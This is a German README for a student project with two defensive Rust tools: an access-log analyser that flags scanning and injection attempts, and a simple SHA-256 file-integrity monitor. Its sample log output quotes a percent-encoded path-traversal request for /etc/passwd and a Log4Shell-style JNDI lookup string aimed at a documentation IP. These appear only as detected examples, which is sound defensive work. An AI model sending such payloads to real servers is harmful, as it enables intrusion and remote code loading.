# Rust-Sicherheitswerkzeuge (Cargo-Workspace)

[English](README.md) · [Français](README.fr.md) · **Deutsch**

**Status:** Done — zwei Crates mit 11 bestandenen Unit-Tests; clippy und rustfmt sauber.

## Ziel

Rust lernen, indem ich zwei kleine, sichere, gut getestete defensive
Werkzeuge baue:

| Crate | Was sie tut |
|-------|-------------|
| [`log-analyzer`](crates/log-analyzer/) | Fasst Apache-/Nginx-Access-Logs im Format *combined* zusammen: häufigste Clients, Statuscodes, Clients mit vielen Fehlern (Scannen) und Anfragen, die auf durchsichtige Heuristiken passen (Path Traversal einschließlich prozentkodiert, sensible Dateien, Admin-Panel-Sonden, Scanner-User-Agents, Injection-Muster). Nur die Standardbibliothek. |
| [`fim`](crates/fim/) | Minimales **Dateiintegritäts-Monitoring**: `baseline` speichert SHA-256 und Größe jeder Datei unter einem Verzeichnis; `check` meldet Dateien als **ADDED / REMOVED / MODIFIED**. Folgt keinen Symlinks. Nutzt die Crate `sha2`. |

(Security+ D4 — Dateiintegrität, Loganalyse; D1 — Integrität, Hashing.)

## Aufbau

```bash
# Install Rust if needed (https://rustup.rs)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
rustup component add clippy rustfmt

cd rust
cargo build --release
cargo test
cargo clippy --all-targets -- -D warnings
cargo fmt --all -- --check
```

`unsafe`-Code ist im ganzen Workspace verboten (`[workspace.lints]`).

## Schritte

### log-analyzer

```bash
cargo run -q -p log-analyzer -- --min-errors 3 samples/access.log.synthetic
sudo ./target/release/log-analyzer /var/log/nginx/access.log --top 20
```

Ausgabe am synthetischen Beispiel (Auszug):

```text
Requests: 12  (malformed lines: 1)  bytes sent: 16902
Clients with >= 3 error responses:
  203.0.113.45 (6)
Flagged requests: 7
  [14/Sep/2026:21:05:03 +0000] 203.0.113.45 GET /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd -> 400 (path-traversal,sensitive-file,scanner-user-agent,injection-pattern)
  [14/Sep/2026:21:07:10 +0000] 198.51.100.23 GET /?x=${jndi:ldap://198.51.100.23/a} -> 400 (injection-pattern)
```

### fim

```bash
cargo build --release -p fim
sudo ./target/release/fim baseline /etc /var/lib/fim/etc.tsv     # store the baseline somewhere safe (ideally read-only / off-host)
sudo ./target/release/fim check    /etc /var/lib/fim/etc.tsv; echo "exit=$?"
```

Demo auf einem Wegwerfverzeichnis (`sshd_config` ändern, `hosts` löschen,
eine neue Cron-Datei ablegen):

```text
$ fim check /tmp/demo /tmp/fim-baseline.tsv
ADDED     etc/cron.d-evil
REMOVED   etc/hosts
MODIFIED  etc/ssh/sshd_config
1 added, 1 removed, 1 modified, 0 unchanged
exit=1
```

Exit-Codes: `0` sauber / Baseline geschrieben, `1` Änderungen erkannt,
`2` Fehler — lässt sich also aus cron oder einem systemd-Timer starten und
bei Nicht-Null alarmieren.

Grenzen (absichtlich, es ist ein Lernprojekt): kein Tracking von Rechten,
Besitzer oder mtime, keine signierte Baseline (ein Angreifer mit root könnte
sie umschreiben — echte Werkzeuge legen Baselines außerhalb des Hosts ab
oder signieren sie), Dateinamen mit Tab oder Zeilenumbruch werden abgelehnt.

### Tests

```text
$ cargo test
fim:          5 passed (SHA-256 test vectors, add/remove/modify detection, exclusions, TSV round-trip & validation, symlink loop)
log-analyzer: 6 passed (parsing, malformed lines, percent-decoding, classification, summary/report)
$ cargo clippy --all-targets -- -D warnings   -> no warnings
```

## Nachweise

- Ausgabe von `cargo test` / `cargo clippy` (oben; der CI-Workflow würde sie
  auch laufen lassen, sobald er aktiv ist — er ist derzeit abgeschaltet).
- Ausgabe von `fim check` nach Änderungen an Dateien in `/etc` einer Lab-VM,
  verglichen mit dem Wazuh-FIM-Alarm für dieselbe Änderung.

## Was ich gelernt habe

_Noch von Lucas auszufüllen._
